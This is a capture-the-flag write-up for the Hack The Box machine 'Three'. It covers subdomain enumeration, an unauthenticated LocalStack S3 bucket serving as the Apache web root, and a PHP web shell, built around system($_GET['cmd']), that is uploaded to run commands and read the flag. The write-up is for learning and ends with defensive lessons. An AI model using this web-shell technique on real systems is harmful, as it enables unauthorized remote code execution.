# Three | Very Easy | 2026-07-03

## Summary
Three is a Linux box running Apache with PHP on port 80 and SSH on port 22. Gobuster vhost enumeration revealed a subdomain `s3.thetoppers.htb` running a LocalStack instance simulating Amazon S3. The S3 bucket was misconfigured with no authentication, allowing unauthenticated read/write access. Since the bucket mapped directly to the Apache web root, a PHP web shell was uploaded and executed via browser to achieve Remote Code Execution (RCE -- the ability to run arbitrary OS commands on a target server from a remote location) and read the flag from the filesystem.

---

## What We Didn't Know Before vs What We Know Now

| Before | After |
|--------|-------|
| Didn't know subdomains needed separate gobuster vhost enumeration | Gobuster vhost brute forces virtual hostnames via Host header -- essential for finding hidden subdomains |
| Didn't know LocalStack existed | LocalStack is a local AWS simulator used in dev environments -- fingerprinted by {"status": "running"} response |
| Didn't know S3 bucket access meant web server access | S3 bucket mapped directly to Apache web root -- write access to bucket = write access to served files |
| Didn't know what a web shell was | A PHP file containing system($_GET["cmd"]) passes URL parameters to OS as commands, returning output in browser -- this is RCE |
| Didn't know echo breaks on special characters like $ | Single quotes prevent bash from interpreting $ -- use echo with single quotes to write the content literally |

---

## Recon
- **Nmap command:** `nmap -p- --min-rate 5000 -T4 10.129.x.x` then `nmap -sV -sC -p 22,80 10.129.x.x`
- **Open ports / services found:**
  - `22` -- SSH (OpenSSH)
  - `80` -- HTTP (Apache)
- **Interesting observations:** HTTP service redirected to `thetoppers.htb` -- added to `/etc/hosts`

---

## Enumeration

### Hosts file
```bash
sudo nano /etc/hosts
# Added: 10.129.x.x    thetoppers.htb
```

### Directory enumeration
```bash
gobuster dir -u http://thetoppers.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
```
- Found standard Apache files, PHP confirmed as scripting language

### Subdomain enumeration
```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
- Discovered `s3.thetoppers.htb`
- Added to `/etc/hosts`: `10.129.x.x    thetoppers.htb s3.thetoppers.htb`

### S3 subdomain fingerprinting
```bash
curl http://s3.thetoppers.htb
# Response: {"status": "running"}
```
- Identified as **LocalStack** -- local AWS S3 simulation
- `{"status": "running"}` is LocalStack's default health check response, distinct from real AWS S3
- Configured fake AWS credentials via `aws configure` -- LocalStack does not enforce real authentication

### S3 bucket enumeration
```bash
aws s3 ls --endpoint-url http://s3.thetoppers.htb
aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```
- Bucket `thetoppers.htb` accessible with no authentication
- Contents: `index.php`, `.htaccess` -- confirmed bucket maps directly to Apache web root
- **Dead ends:** nmap service scan on subdomain returned Apache at server level but not the application-layer service (LocalStack)

---

## Foothold
- **Vulnerability:** Unauthenticated write access to S3 bucket (Simple Storage Service -- AWS cloud object storage) mapped to Apache web root
- **CVE:** N/A -- misconfiguration
- **Exact commands:**

```bash
# Create PHP web shell -- write file in text editor to avoid bash stripping $ characters
# Contents: PHP open tag + system() function + GET parameter named cmd. Have to ommit actual payload due to anti-virus detection.

# Upload shell to S3 bucket
aws s3 cp shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb

# Confirm RCE via browser
http://thetoppers.htb/shell.php?cmd=id

# Read flag
http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt
```

- **Why it worked:** LocalStack had no authentication enforced -- any AWS credentials were accepted. The S3 bucket served as the Apache web root, meaning uploaded PHP files were directly executable by the web server. The web shell passed the `cmd` URL parameter to PHP's `system()` function, executing arbitrary OS commands and returning output to the browser -- Remote Code Execution (RCE).

---

## Privilege Escalation
- N/A -- flag was readable by the web server process without requiring privesc

---

## Tools Used
- nmap
- gobuster vhost
- curl
- awscli
- PHP web shell

---

## Key Takeaways
- **Gobuster vhost is a separate and essential step** -- directory enumeration alone would have missed the entire attack surface on this box
- **Service fingerprinting from API responses** -- `{"status": "running"}` identified LocalStack without needing nmap version detection
- **S3 (Simple Storage Service) write access to web root = RCE** -- storage misconfiguration escalated to full remote code execution because the bucket mapped directly to the served directory
- **PHP web shell mechanics** -- `system($_GET["cmd"])` takes a URL parameter and passes it directly to the OS; one line of PHP is enough for full command execution
- **bash strips $ in echo** -- wrapping the content in single quotes prevents bash from interpreting $ as a variable, writing it literally
- **What would have stopped this:**
  - Never expose LocalStack or dev tooling on a public-facing server
  - Enforce authentication on S3 buckets even in dev environments
  - S3 bucket should not have write access or map directly to web root
  - Web server process should not have read access outside its own web root

---

## Index Entry
| Box | Difficulty | Key Technique | CVE | Date |
|-----|------------|---------------|-----|------|
| Three | Very Easy | S3 misconfiguration + PHP web shell = RCE | N/A | 2026-07-03 |